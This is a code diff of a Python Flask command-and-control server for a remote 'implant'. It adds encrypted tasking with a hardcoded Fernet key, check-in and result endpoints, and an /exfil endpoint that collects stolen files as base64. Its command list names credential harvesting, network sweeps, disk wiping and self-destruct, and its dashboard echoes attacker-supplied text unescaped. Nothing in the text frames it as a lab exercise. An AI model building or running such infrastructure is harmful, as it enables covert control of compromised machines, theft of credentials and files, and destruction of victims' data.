@@ -1,116 +1,141 @@
 from flask import Flask, request, jsonify
-from fernet import encrypt, decrypt
+from cryptography.fernet import Fernet
 import os
 import uuid
+import json
 
 app = Flask(__name__)
+
+# --- CRYPTO SETUP --- #
+MASTER_KEY = b"V9TcZqQXfTm53ri9vPoybLjQN0m0jtrFh09QXRZCi_s="
+cipher = Fernet(MASTER_KEY)
 
 # --- STATE --- #
 commandQ = []
 tasks = {}
-#allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute"]
+inProgress = {}
+results = []
+allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute", "full_chain", "network_sweep", "credential_harvest", "self_destruct"]
 
 # --- ENDPOINTS --- #
 @app.route("/")
 def home():
-    return """
-    <html>
-    <head>
-        <title>Remote C2 Runner</title>
-    </head>
-    <body>
-        <h2>Queue a Command</h2>
-        <input type="text" id="commandInput" placeholder="e.g. whoami" />
-        <button onclick="addCommand()">Send Command</button>
-        <pre id="addResult"></pre>
-
-        <h2>Dispatch Next Command in Queue to the Implant</h2>
-        <button onclick="fetchCommand()">Fetch & Issue Command</button>
-        <pre id="fetchResult"></pre>
-
-        <h2>Queued Commands</h2>
-        <pre>{}</pre>
-
-        <h2>Task History</h2>
-        <pre>{}</pre>
-
-        <script>
-        function addCommand() {{
-            const cmd = document.getElementById('commandInput').value;
-            fetch('/add_command', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify({{command: cmd}})
-            }})
-            .then(r => r.json())
-            .then(data => {{
-                document.getElementById('addResult').textContent = JSON.stringify(data, null, 2);
-                document.getElementById('commandInput').value = '';
-            }});
-        }}
-
-        function fetchCommand() {{
-            fetch('/command')
-                .then(r => r.json())
-                .then(data => {{
-                    document.getElementById('fetchResult').textContent = JSON.stringify(data, null, 2);
-                }});
-        }}
-        </script>
-    </body>
-    </html>
-    """.format(commandQ, tasks)
+    html = "<h1>C2 Dashboard</h1>"
     
+    # Command Submission Form
+    html += "<h2>Send Command</h2>"
+    html += "<form action='/add_command' method='GET'>"
+    html += "<input type='text' name='cmd' placeholder='whoami' style='width:300px; padding:5px;' autofocus>"
+    html += "<button type='submit' style='padding:5px;'>Queue</button>"
+    html += "</form>"
+    
+    # Pending Queue
+    html += "<h2>Pending Queue</h2>"
+    if commandQ:
+        html += "<ul>" + "".join(f"<li>{cmd}</li>" for cmd in commandQ) + "</ul>"
+    else:
+        html += "<p><i>Empty</i></p>"
+
+    # Tasks In Progress
+    html += "<h2>Tasks In Progress</h2>"
+    if inProgress:
+        html += "<ul>" + "".join(f"<li>{cmd} <small>(ID: {tid})</small></li>" for tid, cmd in inProgress.items()) + "</ul>"
+    else:
+        html += "<p><i>None</i></p>"
+        
+    # Results Log
+    html += "<h2>Execution Results</h2>"
+    if not results:
+        html += "<p><i>No results yet</i></p>"
+    for r in reversed(results):
+        html += f"<h3>{r.get('cmd', 'Unknown')} <small>(Task {r.get('taskID', 'N/A')})</small></h3>"
+        html += f"<pre style='background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;'>{r.get('output', '')}</pre>"
+        
+    return html
 
 @app.route("/checkin", methods=["POST"])
 def checkin():
-    data = request.json
-    print("[+] Check-in received:", data)
-    return jsonify({"status": "ok"})
+    try:
+        token = request.get_data().decode('utf-8').strip()
+        decrypted = cipher.decrypt(token.encode('utf-8'))
+        data = json.loads(decrypted)
+        print("[+] Check-in received:", data)
+        results.append({"cmd": "checkin", "taskID": "SYSTEM", "output": f"Check-in from host: {data.get('host', 'Unknown')}"})
+        return "OK"
+    except Exception as e:
+        print(f"[-] Checkin error: {e}")
+        return "ERROR", 400
 
-#takes the first command on the command queue and issues the task to the implant.
 @app.route("/command", methods=["GET"])
 def command():
     if not commandQ:
-        return jsonify({"status": "No Commands Queued"})
+        data = json.dumps({"status": "No Commands Queued"})
+        return cipher.encrypt(data.encode('utf-8')).decode('utf-8')
+        
     cmd = commandQ.pop(0)
     taskID = str(uuid.uuid4())[:8]
     tasks[taskID] = cmd
+    inProgress[taskID] = cmd
     print(f'[+] Issuing task {taskID}: {cmd}')
-    #encrypt the command before sending it off.
-    encrypted_cmd = encrypt(cmd)
-    #print(f'debugging purposes: encrypted cmd: {encrypted_cmd}\n')
-    return jsonify({"taskID": taskID, "command": encrypted_cmd})
+    
+    data = json.dumps({"taskID": taskID, "command": cmd})
+    return cipher.encrypt(data.encode('utf-8')).decode('utf-8')
 
-#adds a command from the allowedCommands list to the queue. 
-@app.route("/add_command", methods=["POST"])
+@app.route("/add_command", methods=["GET", "POST"])
 def add_command():
-    if request.is_json:
+    if request.method == "POST":
         data = request.json
         cmd = data.get("command")
     else:
-        cmd = request.form.get("command")
+        cmd = request.args.get("cmd")
+        
+    if not cmd:
+        return jsonify({"error": "No command provided."}), 400
 
-    #if cmd not in allowedCommands:
-        #return jsonify({"error": "command not allowed."}), 403
     commandQ.append(cmd)
     print(f'[+] Command added to queue: {cmd}')
+    
+    if request.method == "GET":
+        return f"<h1>Command added: {cmd}</h1><p><a href='/'>Return to Dashboard</a></p><script>setTimeout(() => window.location.href='/', 1000);</script>"
     return jsonify({"status": "command added", "command": cmd})
 
 @app.route("/result", methods=["POST"])
 def result():
-    data = request.json
-    taskID = data.get("taskID")
-    output = data.get("output")
-    #decrypt the output received.
     try:
-        output = decrypt(output)
-        #print(f'debugging purposes: encrypted message received: {output}')
-    except:
-        pass
-    cmd = tasks.get(taskID, "unknown")
-    print(f"[+] Result received for {taskID} {cmd}: {output}")
-    return jsonify({"status": "received"})
+        token = request.get_data().decode('utf-8').strip()
+        decrypted = cipher.decrypt(token.encode('utf-8'))
+        data = json.loads(decrypted)
+        
+        taskID = data.get("taskID", "N/A")
+        output = data.get("output", "")
+        cmd = tasks.get(taskID, "initial_recon_or_unknown")
+        print(f"[+] Result received for {taskID} {cmd}: {output}")
+        
+        if taskID in inProgress:
+            del inProgress[taskID]
+            
+        results.append({"taskID": taskID, "cmd": cmd, "output": output})
+        return "OK"
+    except Exception as e:
+        print(f"[-] Result error: {e}")
+        return "ERROR", 400
+
+@app.route("/exfil", methods=["POST"])
+def exfil():
+    try:
+        token = request.get_data().decode('utf-8').strip()
+        decrypted = cipher.decrypt(token.encode('utf-8'))
+        data = json.loads(decrypted)
+        
+        filename = data.get("filename", "unknown_file")
+        b64data = data.get("data", "")
+        print(f"[+] Exfil received: {filename}")
+        
+        results.append({"taskID": "EXFIL", "cmd": f"exfil {filename}", "output": f"[Base64 Payload]\n{b64data}"})
+        return "OK"
+    except Exception as e:
+        print(f"[-] Exfil error: {e}")
+        return "ERROR", 400
 
 # --- RUN --- #
 if __name__ == "__main__":
